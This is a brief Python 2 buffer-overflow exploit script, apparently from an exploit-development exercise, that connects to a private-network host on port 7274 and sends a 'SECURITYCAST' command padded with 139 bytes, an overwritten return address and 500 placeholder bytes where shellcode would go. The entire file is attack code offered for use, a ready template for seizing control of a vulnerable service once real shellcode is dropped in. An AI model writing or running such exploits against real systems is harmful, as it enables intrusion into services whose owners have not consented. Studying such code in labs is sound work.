#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import socket
from struct import *

host="192.168.255.194"
port = 7274

offset = "A" * 139
eip = pack('<L', 0x72741F75)
shellcode = "C" * 500

payload = offset + eip + shellcode

buffer  = "SECURITYCAST "
buffer += payload

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

exp.connect((host,port))

print "[*] Enviando exploit..."
exp.recv(4096)
exp.send(buffer)
exp.close()

